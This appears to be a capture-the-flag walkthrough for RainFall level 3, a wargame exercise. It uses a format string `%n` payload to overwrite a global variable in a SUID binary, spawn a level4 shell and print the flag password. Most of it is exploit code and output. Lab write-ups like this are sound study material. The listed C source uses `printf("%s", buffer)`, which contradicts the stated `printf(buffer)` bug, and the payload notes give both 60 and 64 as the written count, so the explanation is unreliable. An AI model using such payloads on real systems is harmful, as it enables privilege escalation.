# RainFall: Level3 Walkthrough

## Step 1: Overview

Connect to the RainFall server:

```bash
ssh level3@${RAINFALL_IP} -p 4242
```

List the binary:

```bash
level3@RainFall:~$ ls -l
-rwsr-s---+ 1 level4 users 7552 Aug 30  2022 level3
```

This binary is SUID-owned by `level4`, and the objective is to modify the global variable `m` to a specific value using a format string vulnerability.

---

## Step 2: Source Code Summary

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int m = 0;

int v() 
{
    char buffer[512];
    fgets(buffer, sizeof(buffer), stdin);
    printf("%s", buffer);

    int m_1 = m;
    if (m_1 != 64) {
        return m_1;
    }

    fwrite("Wait what?!\n", 1, 12, stdout);
    return system("/bin/sh");
}

int main(int argc, char** argv, char** envp) 
{
    return v();
}
```

The vulnerability is the direct use of `printf(buffer)` without a format string, allowing format string exploitation to overwrite memory.

---

## Step 3: Finding the Address of `m`

Use `objdump` to find the address of the global variable `m`:

```bash
objdump -t ./level3 | grep ' m'
0804988c g     O .bss   00000004              m
```

So the address of `m` is `0x0804988c`.

---

## Step 4: Writing 0x40 into `m` with Format String

We want to write `0x40` (64 decimal) into `m`. To do this, we:

1. Place the address of `m` in little endian format
2. Pad the output to 64 characters
3. Use `%n` to write the byte count into the address

```bash
python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")' > /tmp/level3.exploit
```

Explanation:

* `\x8c\x98\x04\x08`: the address of `m`
* `%60c`: print 60 characters
* `%4$n`: write the count (60) to the 4th parameter (our address)

Note: the printed characters total 64 (4 from the address + 60 from `%60c`)

---

## Step 5: Exploiting the Binary

Execute the binary with our payload:

```bash
(cat /tmp/level3.exploit; cat) | ./level3
```

You should see:

```bash
Wait what?!
$ whoami
level4
```

---

## Step 6: Retrieving the Flag

```bash
$ cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## Step 7: Move to Level04

```bash
level3@RainFall:~$ su level4
Password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
